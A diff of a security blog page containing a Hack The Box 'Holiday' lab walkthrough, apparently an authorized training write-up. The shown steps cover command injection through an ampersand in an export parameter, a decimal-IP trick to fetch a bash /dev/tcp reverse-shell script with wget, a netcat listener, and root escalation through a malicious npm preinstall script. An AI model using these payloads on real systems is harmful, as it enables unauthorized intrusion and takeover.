 <p><strong>Step 5b: Discovering Command Injection</strong>  </p>
 <p>The export request looked like:</p>
-<pre><code>GET /admin/export?table=bookings
+<pre tabindex="0" aria-label="Code or terminal block 24"><code>GET /admin/export?table=bookings
 </code></pre>
 <p>We tried other known table names like <code>users</code> and it worked. But when we tried special characters, we got an error:</p>
-<pre><code>Invalid table name - only characters in the range of [a-z0-9&amp;\s\/] are allowed
+<pre tabindex="0" aria-label="Code or terminal block 25"><code>Invalid table name - only characters in the range of [a-z0-9&amp;\s\/] are allowed
 </code></pre>
 <p><strong>Why is this interesting?</strong><br>The error message is overly specific. It tells us the <strong>exact regex</strong> used to filter input: <code>/[^a-z0-9&amp; \s\/]/g</code>. Most importantly, the <strong><code>&amp;</code> (ampersand)</strong> is allowed.</p>
 <p><strong>Step 5c: Why &amp; Leads to Command Injection</strong>  </p>
 <p>The backend code looks something like:</p>
-<pre><code class="language-javascript" data-language="javascript">exec('sqlite3 hex.db SELECT\ *\ FROM\ ' + filteredTable, ...)
+<pre tabindex="0" aria-label="javascript code or terminal block 26"><code class="language-javascript" data-language="javascript">exec('sqlite3 hex.db SELECT\ *\ FROM\ ' + filteredTable, ...)
 </code></pre>
 <p>When we send <code>table=users&amp;id</code>, the shell sees:</p>
-<pre><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM users&amp;id
+<pre tabindex="0" aria-label="bash code or terminal block 27"><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM users&amp;id
 </code></pre>
 <p>In bash, a single <code>&amp;</code> means: <strong>"Run the command before me in the background, then run the command after me."</strong> So <code>sqlite3 ...</code> runs in the background, and then <code>id</code> executes.</p>
 <p>We verified this:</p>
-<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
+<pre tabindex="0" aria-label="bash code or terminal block 28"><code class="language-bash" data-language="bash">curl -s -A "Linux" \
   -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
   "http://10.129.29.106:8000/admin/export?table=x%26id"
 </code></pre>
@@ -246,11 +247,11 @@ User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like G
 <p><strong>The Solution:</strong> Write the complex payload to a file on Kali, download it with <code>wget</code> (which only uses allowed characters), then execute it with <code>bash</code> (also only allowed characters).</p>
 <p><strong>The Decimal IP Trick:</strong><br><code>wget</code> requires an IP address, but the <code>.</code> (dot) is <strong>blocked</strong> by the filter! However, Linux allows IP addresses to be written as integers.</p>
 <p>Converting <code>10.10.16.84</code>:</p>
-<pre><code>(10 * 256^3) + (10 * 256^2) + (16 * 256) + 84 = 168431700
+<pre tabindex="0" aria-label="Code or terminal block 29"><code>(10 * 256^3) + (10 * 256^2) + (16 * 256) + 84 = 168431700
 </code></pre>
 <p>So <code>wget 168431700/rs</code> is equivalent to <code>wget http://10.10.16.84/rs</code>.</p>
 <p><strong>Preparing the payload file (<code>rs</code>):</strong></p>
-<pre><code class="language-bash" data-language="bash">cat &gt; rs &lt;&lt; 'EOF'
+<pre tabindex="0" aria-label="bash code or terminal block 30"><code class="language-bash" data-language="bash">cat &gt; rs &lt;&lt; 'EOF'
 #!/bin/bash
 bash -i &gt;&amp; /dev/tcp/10.10.16.84/9000 0&gt;&amp;1
 EOF
@@ -260,32 +261,32 @@ EOF
 <ol>
 <li>Start listener on Kali:</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">nc -lnvp 9000
+<pre tabindex="0" aria-label="bash code or terminal block 31"><code class="language-bash" data-language="bash">nc -lnvp 9000
 </code></pre>
 <ol>
 <li>Ensure your web server is running (serving <code>rs</code>):</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
+<pre tabindex="0" aria-label="bash code or terminal block 32"><code class="language-bash" data-language="bash">sudo python3 -m http.server 80
 </code></pre>
 <ol>
 <li>Download the file to the target:</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
+<pre tabindex="0" aria-label="bash code or terminal block 33"><code class="language-bash" data-language="bash">curl -s -A "Linux" \
   -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
   "http://10.129.29.106:8000/admin/export?table=x%26wget+168431700/rs"
 </code></pre>
 <p>The command executed server-side becomes:</p>
-<pre><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM x &amp; wget 168431700/rs
+<pre tabindex="0" aria-label="bash code or terminal block 34"><code class="language-bash" data-language="bash">sqlite3 hex.db SELECT * FROM x &amp; wget 168431700/rs
 </code></pre>
 <ol>
 <li>Execute the downloaded file:</li>
 </ol>
-<pre><code class="language-bash" data-language="bash">curl -s -A "Linux" \
+<pre tabindex="0" aria-label="bash code or terminal block 35"><code class="language-bash" data-language="bash">curl -s -A "Linux" \
   -b "connect.sid=s:d5615f50-5d19-11f1-9c8f-7de48e21f7db.pm+k81sZw90lV0029qnm1CbmRkbIR1zTWwPFCVvJOc4" \
   "http://10.129.29.106:8000/admin/export?table=x%26bash+rs"
 </code></pre>
 <p><strong>Result:</strong> We received a shell on <code>nc -lnvp 9000</code> as <code>algernon</code>.</p>
-<pre><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
+<pre tabindex="0" aria-label="Code or terminal block 36"><code>uid=1001(algernon) gid=1001(algernon) groups=1001(algernon)
 </code></pre>
 <p> <em>When faced with a restrictive filter, break the problem into smaller pieces. You don't need to fit your entire reverse shell into one filtered parameter. Download a file first, then execute it. And always remember alternative IP representations - hexadecimal, decimal, octal. They bypass character filters on dots.</em></p>
 <hr>
@@ -295,11 +296,11 @@ EOF
 <h3 id="baby-step-breakdown-6">Baby Step Breakdown</h3>
 <p><strong>Step 6a: Check <code>sudo -l</code> First</strong>  </p>
 <p>The very first thing you should do on any Linux box after getting a shell is:</p>
-<pre><code class="language-bash" data-language="bash">sudo -l
+<pre tabindex="0" aria-label="bash code or terminal block 37"><code class="language-bash" data-language="bash">sudo -l
 </code></pre>
 <p>This lists what commands the current user can run with elevated privileges.</p>
 <p><strong>Result:</strong></p>
-<pre><code>User algernon may run the following commands on holiday:
+<pre tabindex="0" aria-label="Code or terminal block 38"><code>User algernon may run the following commands on holiday:
     (ALL) NOPASSWD: /usr/bin/npm i *
 </code></pre>
 <p><strong>Why is this dangerous?</strong><br><code>npm i</code> (npm install) doesn't just copy files. It executes <strong>lifecycle scripts</strong> defined in the package's <code>package.json</code>. These scripts include:</p>
@@ -312,7 +313,7 @@ EOF
 <p> <em>Sudo privileges on package managers (npm, pip, gem, apt, etc.) are almost always exploitable. Package managers are designed to execute arbitrary code during installation. If you can install as root, you own the box.</em></p>
 <p><strong>Step 6b: Crafting the Malicious Package</strong>  </p>
 <p>We created a minimal <code>package.json</code>:</p>
-<pre><code class="language-json" data-language="json">{
+<pre tabindex="0" aria-label="json code or terminal block 39"><code class="language-json" data-language="json">{
   "name": "root_please",
   "version": "1.0.0",
   "scripts": {
@@ -323,7 +324,7 @@ EOF
 <p><strong>Why does this work?</strong><br>When npm installs this package, it sees the <code>preinstall</code> script and executes <code>/bin/bash</code> <strong>before</strong> copying any files. Since <code>sudo</code> invoked <code>npm</code>, the bash shell inherits root privileges.</p>
 <p><strong>Why <code>--unsafe</code>?</strong><br>Running <code>npm</code> as root sometimes triggers safety warnings or permission checks. The <code>--unsafe</code> flag (or <code>--unsafe-perm</code>) tells npm to bypass these checks and run scripts anyway.</p>
 <p><strong>Step 6c: Execution</strong>  </p>
-<pre><code class="language-bash" data-language="bash">mkdir -p /dev/shm/privesc &amp;&amp; cd /dev/shm/privesc
+<pre tabindex="0" aria-label="bash code or terminal block 40"><code class="language-bash" data-language="bash">mkdir -p /dev/shm/privesc &amp;&amp; cd /dev/shm/privesc
 cat &gt; package.json &lt;&lt; 'EOF'
 {
   "name": "root_please",
@@ -336,14 +337,14 @@ EOF
 sudo npm i /dev/shm/privesc --unsafe
 </code></pre>
 <p><strong>Output:</strong></p>
-<pre><code>&gt; root_please@1.0.0 preinstall /dev/shm/privesc
+<pre tabindex="0" aria-label="Code or terminal block 41"><code>&gt; root_please@1.0.0 preinstall /dev/shm/privesc
 &gt; /bin/bash
 
 id
 uid=0(root) gid=0(root) groups=0(root)
 </code></pre>
 <p><strong>Step 6d: Capturing the Root Flag</strong>  </p>
-<pre><code class="language-bash" data-language="bash">cat /root/root.txt
+<pre tabindex="0" aria-label="bash code or terminal block 42"><code class="language-bash" data-language="bash">cat /root/root.txt
 # 6ff878[redacted]cd5a68180
 </code></pre>
 <p> <em>Privilege escalation is often about abusing legitimate features, not exploiting memory corruption. <code>sudo npm i</code> is a feature that works exactly as designed - the design is just dangerous. look for "intended functionality" that has unintended security consequences.</em></p>
@@ -361,9 +362,9 @@ uid=0(root) gid=0(root) groups=0(root)
 <p><code>npm</code>, <code>pip</code>, <code>gem</code>, <code>apt</code>, <code>yum</code>- all of these execute code. If a user can run any of these with <code>sudo</code>, they can escalate to root by design.</p>
 <h3 id="6-the-admin-bot-pattern">6. The Admin Bot Pattern</h3>
 <p>Any feature mentioning "approval," "review," or "moderation" implies an automated user with higher privileges. That's your XSS target.</p>
-<hr>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-hackback-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Hackback Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:11:14.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-intentions-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Intentions Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:03:21.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T563,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/#article","headline":"Hack The Box: Holiday Walkthrough","description":"SQL injection recovers a valid login, stored XSS steals the administrator session, command injection creates a web shell, and passwordless npm installation executes package lifecycle code as root.","url":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/","datePublished":"2026-06-11T13:04:55.000Z","dateModified":"2026-06-11T13:04:55.000Z","wordCount":2884,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/4cc7f5ab3a9850c823a7f25cb9da4149648ae445/HTB-Holiday.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-holiday-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Holiday Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+<hr>b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"overview-and-attack-chain","label":"Overview & Attack Chain"},{"id":"step-1-reconnaissance-port-scanning","label":"Step 1: Reconnaissance - Port Scanning"},{"id":"step-2-web-enumeration-the-user-agent-trap","label":"Step 2: Web Enumeration - The User-Agent Trap"},{"id":"step-3-sql-injection-breaking-the-login","label":"Step 3: SQL Injection - Breaking the Login"},{"id":"step-4-stored-xss-stealing-the-admin-session","label":"Step 4: Stored XSS - Stealing the Admin Session"},{"id":"step-5-command-injection-from-admin-to-shell","label":"Step 5: Command Injection - From Admin to Shell"},{"id":"step-6-privilege-escalation-npm-install-as-root","label":"Step 6: Privilege Escalation - npm install as Root"},{"id":"review-notes-and-lessons-learned","label":"Review notes & Lessons Learned"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/4cc7f5ab3a9850c823a7f25cb9da4149648ae445/HTB-Holiday.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 4cc7f5ab3a98",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Holiday, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/holiday","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"7 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-hackback-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Hackback Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:11:14.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-intentions-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Intentions Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T13:03:21.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+13:T563,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/#article","headline":"Hack The Box: Holiday Walkthrough","description":"SQL injection recovers a valid login, stored XSS steals the administrator session, command injection creates a web shell, and passwordless npm installation executes package lifecycle code as root.","url":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/","datePublished":"2026-06-11T13:04:55.000Z","dateModified":"2026-06-11T13:04:55.000Z","wordCount":2884,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/4cc7f5ab3a9850c823a7f25cb9da4149648ae445/HTB-Holiday.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-holiday-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Holiday Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-holiday-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
+f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
+16:null
